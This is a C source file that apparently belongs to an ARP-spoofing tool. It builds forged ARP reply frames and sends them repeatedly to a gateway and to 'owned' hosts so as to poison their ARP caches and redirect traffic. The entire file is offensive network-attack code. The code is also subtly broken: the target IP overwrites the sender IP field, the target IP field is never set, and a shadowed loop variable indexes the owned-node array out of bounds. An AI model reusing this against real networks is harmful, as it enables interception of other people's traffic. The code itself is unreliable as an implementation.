#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <stdbool.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>

#include "spoof.h"
#include "nodes.h"

struct arp_ip4 {
    uint8_t  ar_sha[ETH_ALEN];  /* Sender hardware address.     */
    uint32_t ar_sip;            /* Sender IP address.           */
    uint8_t ar_tha[ETH_ALEN];   /* Target hardware address.     */
    uint32_t  ar_tip;           /* Target IP address.           */
 } __attribute__((packed));

#define ARPREPLY_SIZE (sizeof(struct ether_header) + sizeof(struct arphdr) + sizeof(struct arp_ip4))

void spoof_packet(uint8_t *buffer, uint32_t node_ip4, uint8_t node_hw[ETH_ALEN], uint32_t victim_ip4, uint8_t victim_hw[ETH_ALEN]) {
	assert(buffer);

	struct ether_header *ethernet;
 	struct arphdr *header;
 	struct arp_ip4 *data;

 	ethernet = (struct ether_header *)buffer;
 	header = (struct arphdr *)(buffer + sizeof(struct ether_header));
 	data = (struct arp_ip4 *)(buffer + sizeof(struct ether_header) + sizeof(struct arphdr));

	memcpy(ethernet->ether_dhost, victim_hw, ETH_ALEN);
	memcpy(ethernet->ether_shost, node_hw, ETH_ALEN);
	ethernet->ether_type = htons(ETH_P_ARP);

	header->ar_hrd = htons(ARPHRD_ETHER);
	header->ar_pro = htons(ETH_P_IP);
	header->ar_hln = ETH_ALEN;
	header->ar_pln = 4;
	header->ar_op  = htons(ARPOP_REPLY);

	memcpy(data->ar_sha, node_hw, ETH_ALEN);
	data->ar_sip = node_ip4;
	memcpy(data->ar_tha, victim_hw, ETH_ALEN);
	data->ar_sip = victim_ip4;

}


void Spoof_nodes(int packet_sock, struct CurrentAddress *current) {
	uint8_t *buffer = malloc(ARPREPLY_SIZE);
	int owned_count = nodes_owned_count();
	struct Node **owned = nodes_get_owned();
	int node_count = nodes_count();
	struct Node *nodes = nodes_get();

	uint8_t *gw_hw = node_get(current->gateway)->hwaddr;

	for (int i = 0; i < owned_count; i++) {
		/* spoof router */
		spoof_packet(buffer, owned[i]->ip4addr, owned[i]->hwaddr, current->gateway, gw_hw);
		send(packet_sock, buffer, ARPREPLY_SIZE, 0);

		/* spoof node */
		for (int i = 0; i < node_count; i++) {
			if (nodes[i].is_online) {
				spoof_packet(buffer, nodes[i].ip4addr, current->hwaddr, owned[i]->ip4addr, owned[i]->hwaddr);
				send(packet_sock, buffer, ARPREPLY_SIZE, 0);
			}
		}

	}

	free(buffer);
}
